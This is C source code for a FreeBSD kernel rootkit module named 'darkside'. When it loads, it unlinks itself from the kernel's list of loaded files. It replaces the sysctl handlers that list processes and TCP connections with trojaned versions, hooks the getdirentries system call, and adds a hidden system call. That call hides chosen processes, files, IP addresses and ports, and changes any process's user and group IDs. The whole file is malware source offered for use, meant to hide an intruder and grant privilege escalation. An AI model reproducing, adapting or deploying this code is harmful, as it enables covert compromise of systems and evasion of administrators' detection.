#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/ucred.h>
#include <sys/param.h>
#include <sys/uio.h>
#include <sys/socket.h>
#include <sys/socketvar.h>
#include <sys/sysproto.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/linker.h>
#include <sys/syscall.h>
#include <sys/file.h>
#include <sys/malloc.h>
#include <sys/queue.h>
#include <sys/sysctl.h>
#include <sys/systm.h>
#include <sys/mbuf.h>
#include <sys/protosw.h>
#include <net/route.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
/* #include <netinet/in_var.h> */
#include <netinet/ip_var.h>
#include <netinet/in_pcb.h>
#include <netinet/tcp.h>
#include <netinet/tcp_var.h>
#include <sys/lock.h>
#include <vm/vm.h>
#include <vm/pmap.h>
#include <vm/vm_map.h>
#include <sys/user.h>
#include <sys/resourcevar.h>
#include <sys/dirent.h>
#include <sys/tty.h>

#include "main.h"

static struct protected_hosts *protected_hosts;
static struct protected_ports *protected_ports;
static struct protected_pids *protected_pids;
static struct hidden_files *hidden_files;
	

extern struct lock lock; 
extern linker_file_list_t linker_files; 
extern int next_file_id; 
extern modulelist_t modules; 
extern int nextid; 


#include "trojaned_functions.c"


static moduledata_t r00ter = {"darkside", module_ops, NULL};

static struct sysinit sys_init = 
{	SI_SUB_DRIVERS,
	SI_ORDER_MIDDLE,
	module_register_init,
	&r00ter
};


static int module_ops (struct module *module, int cmd, void *args)
{	switch (cmd)
	{	case MOD_LOAD:
			hide_link_file (module->file->id);
			start_module ();
			break;
		case MOD_UNLOAD:
			end_module();
			break;
		default:
			return (EINVAL);
	}
	return (0);
}


static void const * const
__set_sysinit_set_sym_syscall_sys_init = &sys_init;
__asm(".section .set.""sysinit_set"",\"aw\"");
__asm(".long " "sys_init");
__asm(".previous");


static int check_proc (struct proc *p, int recursive)
{	
	int retstatus = NOTFOUND;
	struct protected_pids *pp;
	struct proc *p2 = p;
	
	do
	{	for (pp=protected_pids; pp != NULL; pp=pp->next)
			if (pp->pid == p2->p_pid)
			{	retstatus = FOUND;
				break;
			}
		p2 =  p2->p_pptr;
	}
	while (recursive && retstatus==NOTFOUND && p2 != NULL);

	return (retstatus);
}

static struct protected_pids* check_pid (int pid)
{
	struct protected_pids *pp;
	for (pp = protected_pids; pp != NULL; pp = pp->next)
		if  (pp->pid == pid)
			break;
	return pp;
}


static int hide_pid (int pid)
{
	struct protected_pids *pp;
	if (protected_pids == NULL)
	{	MALLOC (pp, struct protected_pids*, sizeof(struct protected_pids), HIDDEN_PIDS, M_NOWAIT);
		protected_pids = pp;
	}
	else
	{	for (pp = protected_pids; pp->next != NULL; pp = pp->next);
		MALLOC (pp->next, struct protected_pids*, sizeof(struct protected_pids), HIDDEN_PIDS, M_NOWAIT);
		pp = pp->next;
	}
	pp->next = NULL;
	pp->pid = pid;
	return 0;
}

static int unhide_pid (struct protected_pids *pp)
{
	struct protected_pids hidpid, *pp2 = &hidpid;
	for (pp2->next = protected_pids; pp2->next != pp; pp2 = pp2->next);
	if (pp2->next == protected_pids)
		protected_pids = pp->next;
	else
		pp2->next = pp->next;
	FREE (pp, HIDDEN_PIDS);
	return (0);
}


static struct hidden_files* check_file (char *filename)
{
	struct hidden_files *hf;
	for (hf = hidden_files; hf != NULL; hf = hf->next)	
		if (strcmp (hf->filename, filename) == 0)
			break;
	return (hf);
}

static int hide_file (char *filename)
{
	struct hidden_files *hf;

	if (hidden_files == NULL)
	{	MALLOC (hf, struct hidden_files*, sizeof(struct hidden_files), HIDDEN_FILES, M_NOWAIT);
		hidden_files = hf;
	}
	else
	{	for (hf = hidden_files; hf->next; hf = hf->next);
		MALLOC (hf->next, struct hidden_files*, sizeof(struct hidden_files), HIDDEN_FILES, M_NOWAIT);
		hf = hf->next;
	}
	hf->next = NULL;
	strcpy (hf->filename, filename);
	return (0);
}

static int unhide_file (struct hidden_files *hf)
{
	struct hidden_files hidfiles, *hf2 = &hidfiles;
	for (hf2->next = hidden_files; hf2->next != hf; hf2 = hf2->next);
	if (hf2->next != hidden_files)
		hf2->next = hf->next;
	else
		hidden_files = hf->next;
	free (hf, HIDDEN_FILES);
	return 0;
}

static struct protected_hosts* check_ip (u_int ip)
{
	struct protected_hosts *ph;
	for (ph = protected_hosts; ph != NULL; ph = ph->next)	
		if (ph->ip == ip)
			break;
	return (ph);
}

static u_int hide_ip (u_int ip)
{
	struct protected_hosts *ph;
	if (protected_hosts == NULL)
	{	MALLOC (ph, struct protected_hosts*, sizeof(struct protected_hosts), HIDDEN_HOSTS, M_NOWAIT);
		protected_hosts = ph;
	}
	else
	{	for (ph = protected_hosts; ph->next != NULL; ph = ph->next);
		MALLOC (ph->next, struct protected_hosts*, sizeof(struct protected_hosts), HIDDEN_HOSTS, M_NOWAIT);
		ph = ph->next;
	}
	ph->next = NULL;
	ph->ip = ip;
	return 0;
}

static int unhide_ip (struct protected_hosts *ph)
{
	struct protected_hosts hidip, *ph2 = &hidip;
	for (ph2->next = protected_hosts; ph2->next != ph; ph2 = ph2->next);
	if (ph2->next == protected_hosts)
		protected_hosts = ph->next;
	else
		ph2->next = ph->next;
	FREE (ph, HIDDEN_HOSTS);
	return (0);
}

static struct protected_ports* check_port (u_short port)
{
	struct protected_ports *pp;
	for (pp = protected_ports; pp != NULL; pp = pp->next)	
		if (pp->port == port)
			break;
	return (pp);
}

static int hide_port (u_short port)
{
	struct protected_ports *pp;
	if (protected_ports == NULL)
	{	MALLOC (pp, struct protected_ports*, sizeof(struct protected_ports), HIDDEN_PORTS, M_NOWAIT);
		protected_ports = pp;
	}
	else
	{	for (pp = protected_ports; pp->next != NULL; pp = pp->next);
		MALLOC (pp->next, struct protected_ports*, sizeof(struct protected_ports), HIDDEN_PORTS, M_NOWAIT);
		pp = pp->next;
	}
	pp->next = NULL;
	pp->port = port;
	return 0;
}

static int unhide_port (struct protected_ports *pp)
{
	struct protected_ports hidport, *pp2 = &hidport;
	for (pp2->next = protected_ports; pp2->next != pp; pp2 = pp2->next);
	if (pp2->next == protected_ports)
		protected_ports = pp->next;
	else
		pp2->next = pp->next;
	FREE (pp, HIDDEN_PORTS);
	return (0);
}


static int infect_oid (int *name, int size, int (*infected_func)(SYSCTL_HANDLER_ARGS), int (**old_func)(SYSCTL_HANDLER_ARGS))
{	int index;
	struct sysctl_oid *oid2edit;
	struct sysctl_req req;

	if (sysctl_find_oid (name, size, &oid2edit, &index, &req))
		return (-1);

	if (old_func != NULL)
		*old_func = oid2edit->oid_handler;
	oid2edit->oid_handler = infected_func;
	return (0);
}


static int hide_link_file (int id)
{
	struct linker_file linkfile;
	linker_file_t lf = &linkfile;

	lockmgr(&lock, LK_SHARED, 0, curproc);
	for (TAILQ_NEXT(lf, link) = TAILQ_FIRST(&linker_files); TAILQ_NEXT(lf, link); lf = TAILQ_NEXT(lf, link))
		if (TAILQ_NEXT(lf, link)->id == id)
		{	if (TAILQ_NEXT(lf, link) == TAILQ_FIRST(&linker_files))
				TAILQ_FIRST(&linker_files) = TAILQ_NEXT (TAILQ_FIRST(&linker_files), link);
			else
				TAILQ_NEXT(lf, link) = TAILQ_NEXT(TAILQ_NEXT(lf, link), link);
			break;
		}
	lockmgr(&lock, LK_RELEASE, 0, curproc);

	return lf;
}


static int u2k (struct proc *p,  struct u2k_args *uap)
{
	if (uap->action == HIDE_PID)
	{	int pid;
		struct protected_pids *pp;

		copyin (uap->buff, &pid, sizeof(pid));
		pp = check_pid (pid);
		if (pp != NULL)
			return 0;
		hide_pid (pid);
		return (0);
	}
	else if (uap->action == UNHIDE_PID)
	{	int pid;
		struct protected_pids *pp;

		copyin (uap->buff, &pid, sizeof(pid));
		pp = check_pid (pid);
		if (pp == NULL)
			return 0;
		unhide_pid (pp);
	}
	else if (uap->action == GET_PIDS)
	{	struct protected_pids *pp;
		int i;

		if (uap->buff == NULL)
		{	for (pp=protected_pids, i=0; pp != NULL; pp=pp->next, i++);
			p->p_retval[0] = i;
		}
		else
		{	for (pp=protected_pids; pp != NULL; pp=pp->next, (int)(uap->buff) += sizeof(int))
				copyout (&(pp->pid), uap->buff, sizeof(int));
		}
	}
	else if (uap->action == HIDE_FILE)
	{	char filename[256];
		struct hidden_files *pf;

		copyin (uap->buff, filename, 256);
		pf = check_file (filename);
		if (pf != NULL)
			return 0;
		hide_file (filename);
	}
	else if (uap->action == UNHIDE_FILE)
	{	char filename[NAMELEN];
		struct hidden_files *pf;

		copyin (uap->buff, filename, NAMELEN);
		pf = check_file (filename);
		if (pf == NULL)
			return 0;
		unhide_file (pf);
	}
	else if (uap->action == GET_FILES)
	{	struct hidden_files *ph;
		int i;

		if (uap->buff == NULL)
		{	for (ph=hidden_files, i=0; ph != NULL; ph=ph->next, i++);
			p->p_retval[0] = i;
		}
		else
		{	for (ph=hidden_files; ph != NULL; ph=ph->next, (int)(uap->buff) += NAMELEN)
				copyout (ph->filename, uap->buff, NAMELEN);
		}
	}
	else if (uap->action == HIDE_IP)
	{	u_int ip;
		struct protected_hosts *ph;

		copyin (uap->buff, &ip, sizeof(ip));
		ph = check_ip (ip);
		if (ph != NULL)
			return 0;
		hide_ip (ip);
	}
	else if (uap->action == UNHIDE_IP)
	{	u_int ip;
		struct protected_hosts *ph;

		copyin (uap->buff, &ip, sizeof(ip));
		ph = check_ip (ip);
		if (ph == NULL)
			return 0;
		unhide_ip (ph);
	}
	else if (uap->action == HIDE_PORT)
	{	u_short port;
		struct protected_ports *pp;

		copyin (uap->buff, &port, sizeof(port));
		pp = check_port (port);
		if (pp != NULL)
			return 0;
		hide_port (port);
	}
	else if (uap->action == UNHIDE_PORT)
	{	u_short port;
		struct protected_ports *pp;

		copyin (uap->buff, &port, sizeof(port));
		pp = check_port (port);
		if (pp == NULL)
			return 0;
		unhide_port (pp);
	}
	else if (uap->action == CHANGE_UID)
	{	struct change_priv priv;
		struct proc *p2change;

		copyin (uap->buff, &priv, sizeof(priv));
		if ((p2change = pfind (priv.pid)) == NULL)
			return 0;
		p2change->p_cred->p_ruid = priv.owner;
	}
	else if (uap->action == CHANGE_EUID)
	{	struct change_priv priv;
		struct proc *p2change;

		copyin (uap->buff, &priv, sizeof(priv));
		if ((p2change = pfind (priv.pid)) == NULL)
			return 0;
		p2change->p_cred->p_svuid = priv.owner;
		p2change->p_ucred->cr_uid = priv.owner;
	}
	else if (uap->action == CHANGE_GID)
	{	struct change_priv priv;
		struct proc *p2change;

		copyin (uap->buff, &priv, sizeof(priv));
		if ((p2change = pfind (priv.pid)) == NULL)
			return 0;
		p2change->p_cred->p_rgid = priv.owner;
	}
	else if (uap->action == CHANGE_EGID)
	{	struct change_priv priv;
		struct proc *p2change;

		copyin (uap->buff, &priv, sizeof(priv));
		if ((p2change = pfind (priv.pid)) == NULL)
			return 0;
		p2change->p_cred->p_svgid = priv.owner;
		p2change->p_ucred->cr_groups[0] = priv.owner;
	}

	return (0);
}

static struct sysent trojaned_getdirentries_sysent = {4, trojaned_getdirentries};
static struct sysent my_syscall = {2, u2k};

int (*tcp_pcblist)(SYSCTL_HANDLER_ARGS);
int (*sysctl_kern_proc)(SYSCTL_HANDLER_ARGS);
int (*sysctl_kern_proc_args)(SYSCTL_HANDLER_ARGS);
struct sysent getdirentries_sysent;

static int start_module (void)
{
	int name[CTL_MAXNAME];

	name[0] = CTL_NET;
	name[1] = AF_INET;
	name[2] = IPPROTO_TCP;
	name[3] = TCPCTL_PCBLIST;

	if (infect_oid (name, 4, trojaned_tcp_pcblist, &tcp_pcblist))
	{	printf ("!startup error #1\n");
		return (0);
	}

	name[0] = CTL_KERN;
	name[1] = KERN_PROC;
	name[2] = KERN_PROC_ALL;

	if (infect_oid (name, 3, trojaned_sysctl_kern_proc, &sysctl_kern_proc))
	{	printf ("!startup error #2\n");
		return (0);
	}

	name[2] = KERN_PROC_PID;

	if (infect_oid (name, 3, trojaned_sysctl_kern_proc, NULL))
	{	printf ("!startup error #3\n");
		return (0);
	}

	name[2] = KERN_PROC_PGRP;

	if (infect_oid (name, 3, trojaned_sysctl_kern_proc, NULL))
	{	printf ("!startup error #4\n");
		return (0);
	}

	name[2] = KERN_PROC_TTY;

	if (infect_oid (name, 3, trojaned_sysctl_kern_proc, NULL))
	{	printf ("!startup error #5\n");
		return (0);
	}

	name[2] = KERN_PROC_UID;

	if (infect_oid (name, 3, trojaned_sysctl_kern_proc, NULL))
	{	printf ("!startup error #6\n");
		return (0);
	}

	name[2] = KERN_PROC_RUID;

	if (infect_oid (name, 3, trojaned_sysctl_kern_proc, NULL))
	{	printf ("!startup error #7\n");
		return (0);
	}

	name[2] = KERN_PROC_ARGS;

	if (infect_oid (name, 3, trojaned_sysctl_kern_proc_args, &sysctl_kern_proc_args))
	{	printf ("!startup error #8\n");
		return (0);
	}

	getdirentries_sysent = sysent[SYS_getdirentries];
	sysent[SYS_getdirentries] = trojaned_getdirentries_sysent;
	sysent[210] = my_syscall;

	protected_hosts = NULL;
	protected_ports = NULL;
	protected_pids = NULL;
	hidden_files = NULL;

	return (0);
}

static int end_module (void)
{
	int name[CTL_MAXNAME];

	name[0] = CTL_NET;
	name[1] = AF_INET;
	name[2] = IPPROTO_TCP;
	name[3] = TCPCTL_PCBLIST;

	if (infect_oid (name, 4, tcp_pcblist, NULL))
	{	printf ("!end error #1\n");
		return (0);
	}

	name[0] = CTL_KERN;
	name[1] = KERN_PROC;
	name[2] = KERN_PROC_ALL;

	if (infect_oid (name, 3, sysctl_kern_proc, NULL))
	{	printf ("!end error #2\n");
		return (0);
	}

	name[2] = KERN_PROC_PID;

	if (infect_oid (name, 3, sysctl_kern_proc, NULL))
	{	printf ("!end error #3\n");
		return (0);
	}

	name[2] = KERN_PROC_PGRP;

	if (infect_oid (name, 3, sysctl_kern_proc, NULL))
	{	printf ("!end error #4\n");
		return (0);
	}

	name[2] = KERN_PROC_TTY;

	if (infect_oid (name, 3, sysctl_kern_proc, NULL))
	{	printf ("!end error #5\n");
		return (0);
	}

	name[2] = KERN_PROC_UID;

	if (infect_oid (name, 3, sysctl_kern_proc, NULL))
	{	printf ("!end error #6\n");
		return (0);
	}

	name[2] = KERN_PROC_RUID;

	if (infect_oid (name, 3, sysctl_kern_proc, NULL))
	{	printf ("!end error #7\n");
		return (0);
	}

	name[2] = KERN_PROC_ARGS;

	if (infect_oid (name, 3, sysctl_kern_proc_args, NULL))
	{	printf ("!end error #8\n");
		return (0);
	}

	sysent[SYS_getdirentries] = getdirentries_sysent;

	return (0);
}

